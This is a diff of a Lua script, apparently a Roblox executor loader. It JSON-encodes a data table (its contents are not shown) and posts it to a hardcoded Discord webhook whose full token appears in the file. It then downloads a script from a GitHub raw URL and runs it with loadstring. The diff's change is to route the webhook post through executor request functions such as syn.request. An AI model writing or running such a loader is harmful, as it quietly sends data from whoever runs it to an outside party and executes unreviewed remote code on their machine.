@@ -1,7 +1,7 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 
-local WEBHOOK = https://discordapp.com/api/webhooks/1464221554882773015/ftA-3uBbD71H5K_0RsOgJr5nX0lFdMDlCaOQFPHhmzuo-czcDhJQQJmcH5F3bpBCAqxR"
+local WEBHOOK = "https://discord.com/api/webhooks/1464221554882773015/ftA-3uBbD71H5K_0RsOgJr5nX0lFdMDlCaOQFPHhmzuo-czcDhJQQJmcH5F3bpBCAqxR"
 local MAIN_SCRIPT = "https://raw.githubusercontent.com/nofearscripts/flicks/main/main.lua"
 
 pcall(function()
@@ -21,11 +21,23 @@ pcall(function()
         }}
     }
 
-    HttpService:PostAsync(
-        WEBHOOK,
-        HttpService:JSONEncode(data),
-        Enum.HttpContentType.ApplicationJson
-    )
+    local body = HttpService:JSONEncode(data)
+
+    local req = syn and syn.request
+        or http_request
+        or request
+
+    if req then
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = body
+        })
+    end
 end)
 
 loadstring(game:HttpGet(MAIN_SCRIPT))()
+
